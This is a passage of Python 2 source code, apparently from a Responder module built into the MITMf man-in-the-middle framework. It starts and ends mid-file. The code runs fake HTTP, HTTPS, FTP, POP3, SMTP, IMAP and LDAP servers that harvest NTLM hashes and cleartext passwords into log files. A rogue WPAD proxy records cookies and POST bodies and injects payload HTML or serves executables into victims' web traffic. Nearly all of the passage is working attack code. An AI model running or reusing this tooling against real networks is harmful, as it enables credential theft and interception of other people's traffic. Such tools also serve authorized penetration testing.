			buffer1 = IIS_Auth_Granted(Payload=HTMLToServe)
			buffer1.calculate()
			return str(buffer1)

	else:
		return str(Basic_Ntlm(Basic))

#HTTP Server Class
class HTTP(BaseRequestHandler):

	def handle(self):
		try:
			while True:
				self.request.settimeout(1)
				data = self.request.recv(8092)
				buff = WpadCustom(data,self.client_address[0])
				if buff and WpadForcedAuth(Force_WPAD_Auth) == False:
					Message = "[+]WPAD (no auth) file sent to: %s"%(self.client_address[0])
					if Verbose:
						print Message
					responder_logger.info(Message)
					self.request.send(buff)
				else:
					buffer0 = PacketSequence(data,self.client_address[0])
					self.request.send(buffer0)
		except Exception:
			pass#No need to be verbose..


##################################################################################
#HTTP Proxy Stuff
##################################################################################
def HandleGzip(Headers, Content, Payload):
	if len(Content) > 5:
		try:
			unziped = zlib.decompress(Content, 16+zlib.MAX_WBITS)
		except:
			return False
		InjectPayload = Payload
		Len = ''.join(re.findall('(?<=Content-Length: )[^\r\n]*', Headers))
		HasHTML = re.findall('(?<=<html)[^<]*', unziped)
		if HasHTML :
			if Verbose == True:
				print 'Injecting: %s into the original page'%(Payload)
			Content = unziped.replace("<html", Payload+"\n<html")
			ziped = zlib.compress(Content)
			FinalLen = str(len(ziped))
			Headers = Headers.replace("Content-Length: "+Len, "Content-Length: "+FinalLen)
			return Headers+'\r\n\r\n'+ziped
		else:
			return False
	else:
		return False

def InjectPage(data, client):
	if ServeEXECAlwaysOrNot(Exec_Mode_On_Off):
		if IsExecutable(FILENAME):
			buffer1 = ServeAlwaysExeFile(Payload = ServeEXE(data,client,FILENAME),ContentDiFile=FILENAME)
			buffer1.calculate()
			return str(buffer1)
		else:
			buffer1 = ServeAlwaysNormalFile(Payload = ServeEXE(data,client,FILENAME))
			buffer1.calculate()
			return str(buffer1)
	else:
		return data

def InjectData(data):
	Payload = HTMLToServe
	if len(data.split('\r\n\r\n'))>1:
		try:
			Headers, Content = data.split('\r\n\r\n')
		except:
			return data
		RedirectCodes = ['HTTP/1.1 300', 'HTTP/1.1 301', 'HTTP/1.1 302', 'HTTP/1.1 303', 'HTTP/1.1 304', 'HTTP/1.1 305', 'HTTP/1.1 306', 'HTTP/1.1 307']
		if [s for s in RedirectCodes if s in Headers]:
			return data
		if "Content-Encoding: gzip" in Headers:
			Gzip = HandleGzip(Headers,Content, Payload)
			if Gzip:
				return Gzip
			else:
				return data
		if "content-type: text/html" in Headers.lower():
			Len = ''.join(re.findall('(?<=Content-Length: )[^\r\n]*', Headers))
			HasHTML = re.findall('(?<=<html)[^<]*', Content)
			if HasHTML :
				if Verbose == True:
					print 'Injecting: %s into the original page'%(Payload)
				NewContent = Content.replace("<html", Payload+"\n<html")
				FinalLen = str(len(NewContent))
				Headers = Headers.replace("Content-Length: "+Len, "Content-Length: "+FinalLen)
				return Headers+'\r\n\r\n'+NewContent
			else:
				return data

		else:
			return data

	else:
		return data

#Inspired from Tiny HTTP proxy, original work: SUZUKI Hisao.
class ProxyHandler (BaseHTTPServer.BaseHTTPRequestHandler):
	__base = BaseHTTPServer.BaseHTTPRequestHandler
	__base_handle = __base.handle

	rbufsize = 0

	def handle(self):
		(ip, port) =  self.client_address
		self.__base_handle()

	def _connect_to(self, netloc, soc):
		i = netloc.find(':')
		if i >= 0:
			host_port = netloc[:i], int(netloc[i+1:])
		else:
			host_port = netloc, 80
		try: soc.connect(host_port)
		except socket.error, arg:
			try: msg = arg[1]
			except: msg = arg
			self.send_error(404, msg)
			return 0
		return 1

	def do_CONNECT(self):
		soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			if self._connect_to(self.path, soc):
				self.wfile.write(self.protocol_version +
								 " 200 Connection established\r\n")
				self.wfile.write("Proxy-agent: %s\r\n" % self.version_string())
				self.wfile.write("\r\n")
				try:
					self._read_write(soc, 300)
				except:
					pass
		finally:
			soc.close()
			self.connection.close()

	def do_GET(self):
		(scm, netloc, path, params, query, fragment) = urlparse.urlparse(
			self.path, 'http')
		if scm not in ('http') or fragment or not netloc:
			self.send_error(400, "bad url %s" % self.path)
			return
		soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			if scm == 'http':
				if self._connect_to(netloc, soc):
					soc.send("%s %s %s\r\n" % (self.command,
											   urlparse.urlunparse(('', '', path,
																	params, query,
																	'')),
											   self.request_version))
					if "Cookie" in self.headers:
						Cookie = self.headers['Cookie']
					else:
						Cookie = ''
					Message = "Requested URL: %s\nComplete Cookie: %s\nClient IP is: %s\n"%(self.path, Cookie, self.client_address[0])
					if Verbose == True:
						print Message
					OutFile = "./logs/responder/HTTPCookies/HTTP-Cookie-request-"+netloc+"-from-"+self.client_address[0]+".txt"
					WriteData(OutFile,Message, Message)
					self.headers['Connection'] = 'close'
					del self.headers['Proxy-Connection']
					for key_val in self.headers.items():
						soc.send("%s: %s\r\n" % key_val)
					soc.send("\r\n")
					try:
						self._read_write(soc, netloc)
					except:
						pass

		finally:
			soc.close()
			self.connection.close()

	def _read_write(self, soc, netloc='', max_idling=30):
		iw = [self.connection, soc]
		ow = []
		count = 0
		while 1:
			count += 1
			(ins, _, exs) = select.select(iw, ow, iw, 1)
			if exs:
				break
			if ins:
				for i in ins:
					if i is soc:
						out = self.connection
						try:
							data = i.recv(8192)
							if len(HTMLToServe)>5:
								data = InjectData(data)
							else:
								data = InjectPage(data,self.client_address[0])

						except:
							pass
					else:
						out = soc
						data = i.recv(8192)
						if self.command == "POST":
							Message = "POST data was: %s\n"%(data)
							if Verbose == True:
								print Message
							OutFile = "./logs/responder/HTTPCookies/HTTP-Cookie-request-"+netloc+"-from-"+self.client_address[0]+".txt"
							WriteData(OutFile,Message, Message)
					if data:
						try:
							out.send(data)
							count = 0
						except:
							pass
			if count == max_idling:
				break
		return None


	do_HEAD = do_GET
	do_POST = do_GET
	do_PUT  = do_GET
	do_DELETE=do_GET


##################################################################################
#HTTPS Server
##################################################################################
#Parse NTLMv1/v2 hash.
def ParseHTTPSHash(data,client):
	LMhashLen = struct.unpack('<H',data[12:14])[0]
	LMhashOffset = struct.unpack('<H',data[16:18])[0]
	LMHash = data[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
	NthashLen = struct.unpack('<H',data[20:22])[0]
	NthashOffset = struct.unpack('<H',data[24:26])[0]
	NTHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
	if NthashLen == 24:
		#print "[+]HTTPS NTLMv1 hash captured from :",client
		responder_logger.info('[+]HTTPS NTLMv1 hash captured from :%s'%(client))
		NtHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
		HostNameLen = struct.unpack('<H',data[46:48])[0]
		HostNameOffset = struct.unpack('<H',data[48:50])[0]
		Hostname = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
		#print "Hostname is :", Hostname
		responder_logger.info('[+]HTTPS NTLMv1 Hostname is :%s'%(Hostname))
		UserLen = struct.unpack('<H',data[36:38])[0]
		UserOffset = struct.unpack('<H',data[40:42])[0]
		User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
		#print "User is :", data[UserOffset:UserOffset+UserLen].replace('\x00','')
		responder_logger.info('[+]HTTPS NTLMv1 User is :%s'%(data[UserOffset:UserOffset+UserLen].replace('\x00','')))
		outfile = "./logs/responder/HTTPS-NTLMv1-Client-"+client+".txt"
		WriteHash = User+"::"+Hostname+":"+LMHash+":"+NtHash+":"+NumChal
		WriteData(outfile,WriteHash, User+"::"+Hostname)
		#print "Complete hash is : ", WriteHash
		responder_logger.info('[+]HTTPS NTLMv1 Complete hash is :%s'%(WriteHash))
	if NthashLen > 24:
		#print "[+]HTTPS NTLMv2 hash captured from :",client
		responder_logger.info('[+]HTTPS NTLMv2 hash captured from :%s'%(client))
		NthashLen = 64
		DomainLen = struct.unpack('<H',data[28:30])[0]
		DomainOffset = struct.unpack('<H',data[32:34])[0]
		Domain = data[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
		#print "Domain is : ", Domain
		responder_logger.info('[+]HTTPS NTLMv2 Domain is :%s'%(Domain))
		UserLen = struct.unpack('<H',data[36:38])[0]
		UserOffset = struct.unpack('<H',data[40:42])[0]
		User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
		#print "User is :", User
		responder_logger.info('[+]HTTPS NTLMv2 User is : %s'%(User))
		HostNameLen = struct.unpack('<H',data[44:46])[0]
		HostNameOffset = struct.unpack('<H',data[48:50])[0]
		HostName =  data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
		#print "Hostname is :", HostName
		responder_logger.info('[+]HTTPS NTLMv2 Hostname is :%s'%(HostName))
		outfile = "./logs/responder/HTTPS-NTLMv2-Client-"+client+".txt"
		WriteHash = User+"::"+Domain+":"+NumChal+":"+NTHash[:32]+":"+NTHash[32:]
		WriteData(outfile,WriteHash, User+"::"+Domain)
		#print "Complete hash is : ", WriteHash
		responder_logger.info('[+]HTTPS NTLMv2 Complete hash is :%s'%(WriteHash))

#Handle HTTPS packet sequence.
def HTTPSPacketSequence(data,client):
	a = re.findall('(?<=Authorization: NTLM )[^\\r]*', data)
	b = re.findall('(?<=Authorization: Basic )[^\\r]*', data)
	if a:
		packetNtlm = b64decode(''.join(a))[8:9]
		if packetNtlm == "\x01":
			GrabCookie(data,client)
			r = NTLM_Challenge(ServerChallenge=Challenge)
			r.calculate()
			t = IIS_NTLM_Challenge_Ans()
			t.calculate(str(r))
			buffer1 = str(t)
			return buffer1
		if packetNtlm == "\x03":
			NTLM_Auth= b64decode(''.join(a))
			ParseHTTPSHash(NTLM_Auth,client)
			buffer1 = str(IIS_Auth_Granted(Payload=HTMLToServe))
			return buffer1
	if b:
		GrabCookie(data,client)
		outfile = "./logs/responder/HTTPS-Clear-Text-Password-"+client+".txt"
		WriteData(outfile,b64decode(''.join(b)), b64decode(''.join(b)))
		#print "[+]HTTPS-User & Password:", b64decode(''.join(b))
		responder_logger.info('[+]HTTPS-User & Password: %s'%(b64decode(''.join(b))))
		buffer1 = str(IIS_Auth_Granted(Payload=HTMLToServe))
		return buffer1

	else:
		return str(Basic_Ntlm(Basic))

class SSlSock(ThreadingMixIn, TCPServer):
	def __init__(self, server_address, RequestHandlerClass):
		BaseServer.__init__(self, server_address, RequestHandlerClass)
		ctx = SSL.Context(SSL.SSLv3_METHOD)
		ctx.use_privatekey_file(SSLkey)
		ctx.use_certificate_file(SSLcert)
		self.socket = SSL.Connection(ctx, socket.socket(self.address_family, self.socket_type))
		self.server_bind()
		self.server_activate()

	def shutdown_request(self,request):
		try:
			request.shutdown()
		except:
			pass

class DoSSL(StreamRequestHandler):
	def setup(self):
		self.exchange = self.request
		self.rfile = socket._fileobject(self.request, "rb", self.rbufsize)
		self.wfile = socket._fileobject(self.request, "wb", self.wbufsize)

	def handle(self):
		try:
			while True:
				data = self.exchange.recv(8092)
				self.exchange.settimeout(0.5)
				buff = WpadCustom(data,self.client_address[0])
				if buff:
					self.exchange.send(buff)
				else:
					buffer0 = HTTPSPacketSequence(data,self.client_address[0])
					self.exchange.send(buffer0)
		except:
			pass

##################################################################################
#FTP Stuff
##################################################################################
class FTPPacket(Packet):
	fields = OrderedDict([
		("Code",           "220"),
		("Separator",      "\x20"),
		("Message",        "Welcome"),
		("Terminator",     "\x0d\x0a"),
	])

#FTP server class.
class FTP(BaseRequestHandler):

	def handle(self):
		try:
			self.request.send(str(FTPPacket()))
			data = self.request.recv(1024)
			if data[0:4] == "USER":
				User = data[5:].replace("\r\n","")
				#print "[+]FTP User: ", User
				responder_logger.info('[+]FTP User: %s'%(User))
				t = FTPPacket(Code="331",Message="User name okay, need password.")
				self.request.send(str(t))
				data = self.request.recv(1024)
			if data[0:4] == "PASS":
				Pass = data[5:].replace("\r\n","")
				Outfile = "./logs/responder/FTP-Clear-Text-Password-"+self.client_address[0]+".txt"
				WriteData(Outfile,User+":"+Pass, User+":"+Pass)
				#print "[+]FTP Password is: ", Pass
				responder_logger.info('[+]FTP Password is: %s'%(Pass))
				t = FTPPacket(Code="530",Message="User not logged in.")
				self.request.send(str(t))
				data = self.request.recv(1024)
			else :
				t = FTPPacket(Code="502",Message="Command not implemented.")
				self.request.send(str(t))
				data = self.request.recv(1024)
		except Exception:
			pass

##################################################################################
#LDAP Stuff
##################################################################################

def ParseSearch(data):
	Search1 = re.search('(objectClass)', data)
	Search2 = re.search('(?i)(objectClass0*.*supportedCapabilities)', data)
	Search3 = re.search('(?i)(objectClass0*.*supportedSASLMechanisms)', data)
	if Search1:
		return str(LDAPSearchDefaultPacket(MessageIDASNStr=data[8:9]))
	if Search2:
		return str(LDAPSearchSupportedCapabilitiesPacket(MessageIDASNStr=data[8:9],MessageIDASN2Str=data[8:9]))
	if Search3:
		return str(LDAPSearchSupportedMechanismsPacket(MessageIDASNStr=data[8:9],MessageIDASN2Str=data[8:9]))

def ParseLDAPHash(data,client):
	SSPIStarts = data[42:]
	LMhashLen = struct.unpack('<H',data[54:56])[0]
	if LMhashLen > 10:
		LMhashOffset = struct.unpack('<H',data[58:60])[0]
		LMHash = SSPIStarts[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
		NthashLen = struct.unpack('<H',data[64:66])[0]
		NthashOffset = struct.unpack('<H',data[66:68])[0]
		NtHash = SSPIStarts[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
		DomainLen = struct.unpack('<H',data[72:74])[0]
		DomainOffset = struct.unpack('<H',data[74:76])[0]
		Domain = SSPIStarts[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
		UserLen = struct.unpack('<H',data[80:82])[0]
		UserOffset = struct.unpack('<H',data[82:84])[0]
		User = SSPIStarts[UserOffset:UserOffset+UserLen].replace('\x00','')
		writehash = User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal
		Outfile = "./logs/responder/LDAP-NTLMv1-"+client+".txt"
		WriteData(Outfile,writehash,User+"::"+Domain)
		#print "[LDAP] NTLMv1 complete hash is :", writehash
		responder_logger.info('[LDAP] NTLMv1 complete hash is :%s'%(writehash))
	if LMhashLen <2 :
		Message = '[+]LDAP Anonymous NTLM authentication, ignoring..'
		#print Message
		responder_logger.info(Message)

def ParseNTLM(data,client):
	Search1 = re.search('(NTLMSSP\x00\x01\x00\x00\x00)', data)
	Search2 = re.search('(NTLMSSP\x00\x03\x00\x00\x00)', data)
	if Search1:
		NTLMChall = LDAPNTLMChallenge(MessageIDASNStr=data[8:9],NTLMSSPNtServerChallenge=Challenge)
		NTLMChall.calculate()
		return str(NTLMChall)
	if Search2:
		ParseLDAPHash(data,client)

def ParseLDAPPacket(data,client):
	if data[1:2] == '\x84':
		PacketLen = struct.unpack('>i',data[2:6])[0]
		MessageSequence = struct.unpack('<b',data[8:9])[0]
		Operation = data[9:10]
		sasl = data[20:21]
		OperationHeadLen = struct.unpack('>i',data[11:15])[0]
		LDAPVersion = struct.unpack('<b',data[17:18])[0]
		if Operation == "\x60":
			UserDomainLen = struct.unpack('<b',data[19:20])[0]
			UserDomain = data[20:20+UserDomainLen]
			AuthHeaderType = data[20+UserDomainLen:20+UserDomainLen+1]
			if AuthHeaderType == "\x80":
				PassLen = struct.unpack('<b',data[20+UserDomainLen+1:20+UserDomainLen+2])[0]
				Password = data[20+UserDomainLen+2:20+UserDomainLen+2+PassLen]
				#print '[LDAP]Clear Text User & Password is:', UserDomain+":"+Password
				outfile = "./logs/responder/LDAP-Clear-Text-Password-"+client+".txt"
				WriteData(outfile,'[LDAP]User: %s Password: %s'%(UserDomain,Password),'[LDAP]User: %s Password: %s'%(UserDomain,Password))
				responder_logger.info('[LDAP]User: %s Password: %s'%(UserDomain,Password))
			if sasl == "\xA3":
				buff = ParseNTLM(data,client)
				return buff
		elif Operation == "\x63":
			buff = ParseSearch(data)
			return buff
		else:
			responder_logger.info('[LDAP]Operation not supported')

#LDAP Server Class
class LDAP(BaseRequestHandler):

	def handle(self):
		try:
			while True:
				self.request.settimeout(0.5)
				data = self.request.recv(8092)
				buffer0 = ParseLDAPPacket(data,self.client_address[0])
				if buffer0:
					self.request.send(buffer0)
		except Exception:
			pass #No need to print timeout errors.

##################################################################################
#POP3 Stuff
##################################################################################
class POPOKPacket(Packet):
	fields = OrderedDict([
		("Code",           "+OK"),
		("CRLF",      "\r\n"),
	])

#POP3 server class.
class POP(BaseRequestHandler):

	def handle(self):
		try:
			self.request.send(str(POPOKPacket()))
			data = self.request.recv(1024)
			if data[0:4] == "USER":
				User = data[5:].replace("\r\n","")
				responder_logger.info('[+]POP3 User: %s'%(User))
				t = POPOKPacket()
				self.request.send(str(t))
				data = self.request.recv(1024)
			if data[0:4] == "PASS":
				Pass = data[5:].replace("\r\n","")
				Outfile = "./logs/responder/POP3-Clear-Text-Password-"+self.client_address[0]+".txt"
				WriteData(Outfile,User+":"+Pass, User+":"+Pass)
				#print "[+]POP3 Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],User,Pass)
				responder_logger.info("[+]POP3 Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],User,Pass))
				t = POPOKPacket()
				self.request.send(str(t))
				data = self.request.recv(1024)
			else :
				t = POPOKPacket()
				self.request.send(str(t))
				data = self.request.recv(1024)
		except Exception:
			pass

##################################################################################
#ESMTP Stuff
##################################################################################

#ESMTP server class.
class ESMTP(BaseRequestHandler):

	def handle(self):
		try:
			self.request.send(str(SMTPGreating()))
			data = self.request.recv(1024)
			if data[0:4] == "EHLO":
				self.request.send(str(SMTPAUTH()))
				data = self.request.recv(1024)
			if data[0:4] == "AUTH":
				self.request.send(str(SMTPAUTH1()))
				data = self.request.recv(1024)
				if data:
					Username = b64decode(data[:len(data)-2])
					self.request.send(str(SMTPAUTH2()))
					data = self.request.recv(1024)
					if data:
						Password = b64decode(data[:len(data)-2])
						Outfile = "./logs/responder/SMTP-Clear-Text-Password-"+self.client_address[0]+".txt"
						WriteData(Outfile,Username+":"+Password, Username+":"+Password)
						#print "[+]SMTP Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],Username,Password)
						responder_logger.info("[+]SMTP Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],Username,Password))

		except Exception:
			pass

##################################################################################
#IMAP4 Stuff
##################################################################################

#ESMTP server class.
class IMAP(BaseRequestHandler):

	def handle(self):
		try:
			self.request.send(str(IMAPGreating()))
			data = self.request.recv(1024)
			if data[5:15] == "CAPABILITY":
				RequestTag = data[0:4]
				self.request.send(str(IMAPCapability()))
				self.request.send(str(IMAPCapabilityEnd(Tag=RequestTag)))
				data = self.request.recv(1024)
			if data[5:10] == "LOGIN":
				Credentials = data[10:].strip()
				Outfile = "./logs/responder/IMAP-Clear-Text-Password-"+self.client_address[0]+".txt"
				WriteData(Outfile,Credentials, Credentials)
				#print '[+]IMAP Credentials from %s. ("User" "Pass"): %s'%(self.client_address[0],Credentials)
				responder_logger.info('[+]IMAP Credentials from %s. ("User" "Pass"): %s'%(self.client_address[0],Credentials))
				self.request.send(str(ditchthisconnection()))
				data = self.request.recv(1024)

		except Exception:
			pass
##################################################################################
#Loading the servers
##################################################################################

#Function name self-explanatory
def Is_HTTP_On(on_off):
	if on_off == "ON":
		t = threading.Thread(name="HTTP", target=serve_thread_tcp, args=('', 80,HTTP))
		t.setDaemon(True)
		t.start()
		return t
	if on_off == "OFF":
		return False

#Function name self-explanatory
def Is_HTTPS_On(SSL_On_Off):
	if SSL_On_Off == "ON":
		t = threading.Thread(name="SSL", target=serve_thread_SSL, args=('', 443,DoSSL))        
		t.setDaemon(True)
		t.start()
		return t
	if SSL_On_Off == "OFF":
		return False

#Function name self-explanatory
def Is_WPAD_On(on_off):
	if on_off == True:
		t = threading.Thread(name="WPAD", target=serve_thread_tcp, args=('', 3141,ProxyHandler))
		t.setDaemon(True)
		t.start()
		return t
	if on_off == False:
		return False

#Function name self-explanatory
def Is_SMB_On(SMB_On_Off):
	if SMB_On_Off == "ON":
		if LM_On_Off == True:
			t1  = threading.Thread(name="SMB1LM-445", target=serve_thread_tcp, args=('', 445,SMB1LM))
			t2 = threading.Thread(name="SMB1LM-139", target=serve_thread_tcp, args=('', 139,SMB1LM))
			for t in [t1, t2]:
				t.setDaemon(True)
				t.start()

			return t1, t2

		else:
			t1 = threading.Thread(name="SMB1-445", target=serve_thread_tcp, args=('', 445,SMB1))
			t2 = threading.Thread(name="SMB1-139", target=serve_thread_tcp, args=('', 139,SMB1))

			for t in [t1,t2]:
				t.setDaemon(True)
				t.start()

			return t1, t2

	if SMB_On_Off == "OFF":
		return False

#Function name self-explanatory
def Is_Kerberos_On(Krb_On_Off):
	if Krb_On_Off == "ON":
		t1 = threading.Thread(name="KerbUDP", target=serve_thread_udp, args=('', 88,KerbUDP))
		t2 = threading.Thread(name="KerbTCP", target=serve_thread_tcp, args=('', 88, KerbTCP))
		for t in [t1,t2]:
			t.setDaemon(True)
			t.start()

		return t1, t2
	if Krb_On_Off == "OFF":
		return False

#Function name self-explanatory
def Is_SQL_On(SQL_On_Off):
	if SQL_On_Off == "ON":
		t = threading.Thread(name="MSSQL", target=serve_thread_tcp, args=('', 1433,MSSQL))
		t.setDaemon(True)
		t.start()
		return t
	if SQL_On_Off == "OFF":
		return False

#Function name self-explanatory
def Is_FTP_On(FTP_On_Off):
	if FTP_On_Off == "ON":
		t = threading.Thread(name="FTP", target=serve_thread_tcp, args=('', 21,FTP))
		t.setDaemon(True)
		t.start()
		return t

	if FTP_On_Off == "OFF":
		return False

#Function name self-explanatory
def Is_POP_On(POP_On_Off):
	if POP_On_Off == "ON":
		t = threading.Thread(name="POP", target=serve_thread_tcp, args=('', 110,POP))
		t.setDaemon(True)
		t.start()
		return t
	if POP_On_Off == "OFF":
		return False

#Function name self-explanatory
def Is_LDAP_On(LDAP_On_Off):
	if LDAP_On_Off == "ON":
		t = threading.Thread(name="LDAP", target=serve_thread_tcp, args=('', 389,LDAP))
		t.setDaemon(True)
		t.start()
		return t
	if LDAP_On_Off == "OFF":
		return False

#Function name self-explanatory
def Is_SMTP_On(SMTP_On_Off):
	if SMTP_On_Off == "ON":
		t1 = threading.Thread(name="ESMTP-25", target=serve_thread_tcp, args=('', 25,ESMTP))
		t2 = threading.Thread(name="ESMTP-587", target=serve_thread_tcp, args=('', 587,ESMTP))
		
		for t in [t1, t2]:
			t.setDaemon(True)
			t.start()

		return t1,t2

	if SMTP_On_Off == "OFF":
		return False

#Function name self-explanatory
def Is_IMAP_On(IMAP_On_Off):
	if IMAP_On_Off == "ON":
		t = threading.Thread(name="IMAP", target=serve_thread_tcp, args=('', 143,IMAP))
		t.setDaemon(True)
		t.start()
		return t
	if IMAP_On_Off == "OFF":
		return False

#Function name self-explanatory
def Is_DNS_On(DNS_On_Off):
	if DNS_On_Off == "ON":
		t1 = threading.Thread(name="DNS", target=serve_thread_udp, args=('', 53,DNS))
		t2 = threading.Thread(name="DNSTCP", target=serve_thread_udp, args=('', 53,DNSTCP))
		for t in [t1, t2]:
			t.setDaemon(True)
			t.start()

		return t1,t2
	if DNS_On_Off == "OFF":
		return False

class ThreadingUDPServer(ThreadingMixIn, UDPServer):

	def server_bind(self):
		if OsInterfaceIsSupported(INTERFACE):
			try:
				self.socket.setsockopt(socket.SOL_SOCKET, 25, BIND_TO_Interface+'\0')
			except:
				pass
		UDPServer.server_bind(self)

class ThreadingTCPServer(ThreadingMixIn, TCPServer):

	def server_bind(self):
		if OsInterfaceIsSupported(INTERFACE):
			try:
				self.socket.setsockopt(socket.SOL_SOCKET, 25, BIND_TO_Interface+'\0')
			except:
				pass
		TCPServer.server_bind(self)

class ThreadingUDPMDNSServer(ThreadingMixIn, UDPServer):

	def server_bind(self):
		MADDR = "224.0.0.251"
		self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
		Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,inet_aton(MADDR)+inet_aton(OURIP))
		if OsInterfaceIsSupported(INTERFACE):
			try:
				self.socket.setsockopt(socket.SOL_SOCKET, 25, BIND_TO_Interface+'\0')
			except:
				pass
		UDPServer.server_bind(self)

class ThreadingUDPLLMNRServer(ThreadingMixIn, UDPServer):

	def server_bind(self):
		MADDR = "224.0.0.252"
		self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
		Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,inet_aton(MADDR)+inet_aton(OURIP))
		if OsInterfaceIsSupported(INTERFACE):
			try:
				self.socket.setsockopt(socket.SOL_SOCKET, 25, BIND_TO_Interface+'\0')
			except:
				pass
		UDPServer.server_bind(self)

ThreadingUDPServer.allow_reuse_address = 1
ThreadingUDPMDNSServer.allow_reuse_address = 1
ThreadingUDPLLMNRServer.allow_reuse_address = 1
ThreadingTCPServer.allow_reuse_address = 1


def serve_thread_udp(host, port, handler):
	try:
		if OsInterfaceIsSupported(INTERFACE):
			IP = FindLocalIP(BIND_TO_Interface)
			server = ThreadingUDPServer((IP, port), handler)
			server.serve_forever()
		else:
			server = ThreadingUDPServer((host, port), handler)
			server.serve_forever()
	except Exception, e:
		print "Error starting UDP server on port %s: %s:" % (str(port),str(e))

def serve_thread_udp_MDNS(host, port, handler):
	try:
		server = ThreadingUDPMDNSServer((host, port), handler)
		server.serve_forever()
	except Exception, e:
		print "Error starting UDP server on port %s: %s:" % (str(port),str(e))

def serve_thread_udp_LLMNR(host, port, handler):
	try:
		server = ThreadingUDPLLMNRServer((host, port), handler)
		server.serve_forever()
	except Exception, e:
		print "Error starting UDP server on port %s: %s:" % (str(port),str(e))

def serve_thread_tcp(host, port, handler):
	try:
		if OsInterfaceIsSupported(INTERFACE):
			IP = FindLocalIP(BIND_TO_Interface)
			server = ThreadingTCPServer((IP, port), handler)
			server.serve_forever()
		else:
			server = ThreadingTCPServer((host, port), handler)
			server.serve_forever()
	except Exception, e:
		print "Error starting TCP server on port %s: %s:" % (str(port),str(e))

def serve_thread_SSL(host, port, handler):
	try:
		if OsInterfaceIsSupported(INTERFACE):
			IP = FindLocalIP(BIND_TO_Interface)
			server = SSlSock((IP, port), handler)
			server.serve_forever()
		else:
			server = SSlSock((host, port), handler)
			server.serve_forever()
	except Exception, e:
		print "Error starting TCP server on port %s: %s:" % (str(port),str(e))

class ResponderMITMf():

	def setCoreVars(self, options, config):

		global VERSION; VERSION = '2.1.2'

		global On_Off; On_Off = config['HTTP'].upper()
		global SSL_On_Off; SSL_On_Off = config['HTTPS'].upper()
		global SMB_On_Off; SMB_On_Off = config['SMB'].upper()
		global SQL_On_Off; SQL_On_Off = config['SQL'].upper()
		global FTP_On_Off; FTP_On_Off = config['FTP'].upper()
		global POP_On_Off; POP_On_Off = config['POP'].upper()
		global IMAP_On_Off; IMAP_On_Off = config['IMAP'].upper()
		global SMTP_On_Off; SMTP_On_Off = config['SMTP'].upper()
		global LDAP_On_Off; LDAP_On_Off = config['LDAP'].upper()
		global DNS_On_Off; DNS_On_Off = "OFF"
		global Krb_On_Off; Krb_On_Off = config['Kerberos'].upper()
		global NumChal; NumChal = config['Challenge']
		global SessionLog; SessionLog = config['SessionLog']
		global Exe_On_Off; Exe_On_Off = config['HTTP Server']['Serve-Exe'].upper()
		global Exec_Mode_On_Off; Exec_Mode_On_Off = config['HTTP Server']['Serve-Always'].upper()
		global FILENAME; FILENAME = config['HTTP Server']['Filename']
		global WPAD_Script; WPAD_Script = config['HTTP Server']['WPADScript']
		#HTMLToServe = config.get('HTTP Server', 'HTMLToServe')

		global SSLcert; SSLcert = config['HTTPS Server']['cert']
		global SSLkey; SSLkey = config['HTTPS Server']['key']

		global RespondTo; RespondTo = config['RespondTo'].strip()
		RespondTo.split(",")
		global RespondToName; RespondToName = config['RespondToName'].strip()
		RespondToName.split(",")
		global DontRespondTo; DontRespondTo = config['DontRespondTo'].strip()
		DontRespondTo.split(",")
		global DontRespondToName; DontRespondToName = config['DontRespondToName'].strip()
		DontRespondToName.split(",")

		HTMLToServe = ''

		if len(NumChal) is not 16:
			sys.exit("[-] The challenge must be exactly 16 chars long.\nExample: -c 1122334455667788\n")

		# Break out challenge for the hexidecimally challenged.  Also, avoid 2 different challenges by accident.
		global Challange; Challenge = ""
		for i in range(0,len(NumChal),2):
			Challenge += NumChal[i:i+2].decode("hex")

		#Cli options.
		global OURIP; OURIP = options.ip_address
		global LM_On_Off; LM_On_Off = options.LM_On_Off
		global WPAD_On_Off; WPAD_On_Off = options.WPAD_On_Off
		global Wredirect; Wredirect = options.Wredirect
		global NBTNSDomain; NBTNSDomain = options.NBTNSDomain
		global Basic; Basic = options.Basic
		global Finger_On_Off; Finger_On_Off = options.Finger
		global Verbose; Verbose = True
		global Force_WPAD_Auth; Force_WPAD_Auth = options.Force_WPAD_Auth
		global AnalyzeMode; AnalyzeMode = options.Analyse
		global INTERFACE; INTERFACE = "Not set"
		global BIND_TO_Interface; BIND_TO_Interface = "ALL" 

	def AnalyzeICMPRedirect(self):
		result = False

		if Analyze(AnalyzeMode) and OURIP is not None and INTERFACE == 'Not set':
			result = self.IsICMPRedirectPlausible(OURIP)
		
		if Analyze(AnalyzeMode) and INTERFACE != 'Not set':
			result = self.IsICMPRedirectPlausible(FindLocalIP(INTERFACE))

		return result

	def IsICMPRedirectPlausible(self, IP):
		result = []
		dnsip = []
		for line in file('/etc/resolv.conf', 'r'):
			ip = line.split()
			if len(ip) < 2:
			   continue
			if ip[0] == 'nameserver':
				dnsip.extend(ip[1:])
		for x in dnsip:
			if x !="127.0.0.1" and IsOnTheSameSubnet(x,IP) == False:
